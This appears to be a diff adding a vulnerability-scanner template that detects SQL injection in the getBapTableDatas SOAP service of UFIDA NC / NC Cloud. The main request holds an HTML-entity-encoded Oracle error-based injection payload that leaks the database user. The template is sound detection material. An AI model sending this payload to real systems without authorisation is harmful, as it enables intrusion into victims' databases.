@@ -1,0 +1,36 @@
+id: youyou-UFIDA-NC-IBapIOService-sqli
+
+info:
+  name: 用友NC及NC Cloud系统 getBapTableDatas 存在SQL注入漏洞
+  author: youyou
+  severity: high
+  tags: youyou
+
+http:
+  - raw:
+      - |
+        POST /uapws/service/nc.itf.bap.service.IBapIOService HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: text/xml
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
+
+        <?xml version="1.0" encoding="UTF-8" standalone="no"?>
+        <soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:gs="http://service.bap.itf.nc/IBapIOService">
+            <soapenv:Header/>
+            <soapenv:Body>
+                <gs:getBapTableDatas>
+                    <gs:stringarrayItem>&#x44;&#x57;&#x51;&#x75;&#x65;&#x75;&#x65;&#x40;&#x4d;&#x65;&#x73;&#x73;&#x61;&#x67;&#x65;&#x51;&#x75;&#x65;&#x75;&#x65;&#x27;&#x20;&#x41;&#x4e;&#x44;&#x20;&#x31;&#x3d;&#x55;&#x54;&#x4c;&#x5f;&#x49;&#x4e;&#x41;&#x44;&#x44;&#x52;&#x2e;&#x47;&#x45;&#x54;&#x5f;&#x48;&#x4f;&#x53;&#x54;&#x5f;&#x41;&#x44;&#x44;&#x52;&#x45;&#x53;&#x53;&#x28;&#x27;&#x7e;&#x27;&#x7c;&#x7c;&#x28;&#x75;&#x73;&#x65;&#x72;&#x29;&#x7c;&#x7c;&#x27;&#x7e;&#x27;&#x29;&#x2d;&#x2d;&#x20;&#x61;&#x62;&#x63;
+        </gs:stringarrayItem>
+                </gs:getBapTableDatas>
+            </soapenv:Body>
+        </soapenv:Envelope>
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "IBapIOService"
+          - "未知的主机"
+          - "faultstring"
+        part: body
+        condition: and
